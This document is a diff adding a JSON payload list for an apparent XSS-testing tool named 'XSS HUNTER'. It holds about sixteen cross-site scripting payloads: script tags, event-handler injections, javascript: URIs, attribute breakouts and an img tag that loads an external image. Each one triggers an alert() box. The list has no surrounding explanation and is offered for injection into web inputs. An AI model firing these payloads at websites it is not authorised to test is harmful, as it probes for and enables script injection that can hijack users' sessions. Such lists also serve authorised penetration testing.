@@ -1,0 +1,21 @@
+{
+  "tool": "XSS HUNTER",
+  "payloads": [
+    "<h1>XSS HUNTER</h1>",
+    "<script>alert('XSS HUNTER')</script>",
+    "\"><svg/onload=alert('XSS HUNTER')>",
+    "' onfocus='alert(\"XSS HUNTER\")' autofocus",
+    "<img src=x onerror=alert('XSS HUNTER')>",
+    "<iframe src=javascript:alert('XSS HUNTER')>",
+    "<body onload=alert('XSS HUNTER')>",
+    "<details open ontoggle=alert('XSS HUNTER')>",
+    "<object data=javascript:alert('XSS HUNTER')>",
+    "<video><source onerror=\"alert('XSS HUNTER')\"></video>",
+    "<a href=\"javascript:alert('XSS HUNTER')\">Click</a>",
+    "<marquee onstart=alert('XSS HUNTER')>test</marquee>",
+    "<math href=\"javascript:alert('XSS HUNTER')\">X</math>",
+    "<input onfocus=alert('XSS HUNTER') autofocus>",
+    "<form onsubmit=alert('XSS HUNTER')><input type=submit></form>",
+    "<img src=\\\"https://i.ibb.co/0VqSNvhs/Proyek-Baru-49-E6742-F7.png\\\" style=\\\"width:300px; background-color:black; display:block;\\\" onerror=\\\"alert('XSS HUNTER')\\\">"
+  ]
+}
